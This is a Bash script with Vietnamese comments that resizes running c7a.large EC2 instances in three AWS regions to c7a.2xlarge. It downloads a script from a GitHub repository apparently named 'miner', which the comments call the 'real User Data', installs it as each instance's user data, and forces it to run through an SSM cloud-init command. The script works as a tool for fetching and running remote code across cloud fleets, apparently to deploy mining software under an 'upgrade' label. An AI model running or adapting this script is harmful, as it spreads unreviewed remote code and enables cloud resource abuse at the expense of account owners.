#!/bin/bash

# Danh sách các region cần nâng cấp
regions=("us-east-1" "us-west-2" "us-east-2")

# URL chứa User Data thật trên GitHub
user_data_url="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/viauto"

# Tải User Data thật từ GitHub
user_data_file="/tmp/user_data.sh"
echo "Đang tải User Data từ GitHub..."
curl -s -L "$user_data_url" -o "$user_data_file"

# Kiểm tra nếu tải về thất bại
if [ ! -s "$user_data_file" ]; then
    echo "Lỗi: Không thể tải User Data từ GitHub."
    exit 1
fi

# Encode User Data thành base64 để AWS sử dụng
user_data_base64=$(base64 -w 0 "$user_data_file")

# Lặp qua từng region
for region in "${regions[@]}"; do
    echo "🔹 Đang xử lý region: $region"

    # Lấy danh sách instance đang chạy loại c7a.large
    instance_ids=$(aws ec2 describe-instances \
        --filters "Name=instance-type,Values=c7a.large" "Name=instance-state-name,Values=running" \
        --region "$region" \
        --query "Reservations[*].Instances[*].InstanceId" \
        --output text)

    if [ -z "$instance_ids" ]; then
        echo "⚠️ Không tìm thấy instance c7a.large trong $region. Bỏ qua."
        continue
    fi

    echo "✅ Các instance cần nâng cấp: $instance_ids"

    for instance_id in $instance_ids; do
        echo "🔄 Đang nâng cấp Instance $instance_id lên c7a.2xlarge..."

        # Dừng instance trước khi thay đổi loại
        aws ec2 stop-instances --instance-ids "$instance_id" --region "$region"
        echo "⏳ Đang chờ Instance $instance_id tắt..."

        aws ec2 wait instance-stopped --instance-ids "$instance_id" --region "$region"

        # Thay đổi loại máy thành c7a.2xlarge
        aws ec2 modify-instance-attribute \
            --instance-id "$instance_id" \
            --instance-type "{\"Value\": \"c7a.2xlarge\"}" \
            --region "$region"
        echo "✅ Đã thay đổi Instance $instance_id thành c7a.2xlarge."

        # Cập nhật User Data thật
        aws ec2 modify-instance-attribute \
            --instance-id "$instance_id" \
            --user-data "{\"Value\": \"$user_data_base64\"}" \
            --region "$region"
        echo "✅ User Data thật đã được gán cho Instance $instance_id."

        # Khởi động lại Instance
        aws ec2 start-instances --instance-ids "$instance_id" --region "$region"
        echo "🔄 Đang khởi động lại Instance $instance_id..."

        aws ec2 wait instance-running --instance-ids "$instance_id" --region "$region"
        echo "✅ Instance $instance_id đã chạy lại thành công!"

        # Ép buộc EC2 chạy lại User Data
        echo "⚡ Ép buộc chạy lại User Data trên $instance_id..."
        aws ssm send-command \
            --document-name "AWS-RunShellScript" \
            --targets "[{\"Key\":\"InstanceIds\",\"Values\":[\"$instance_id\"]}]" \
            --region "$region" \
            --parameters '{"commands":["sudo cloud-init clean","sudo cloud-init init","sudo cloud-init modules --mode config","sudo cloud-init modules --mode final","sudo reboot"]}'
        echo "✅ Đã gửi lệnh thực thi lại User Data!"
    done
done

echo "🎉 Hoàn tất nâng cấp tất cả Instances!"
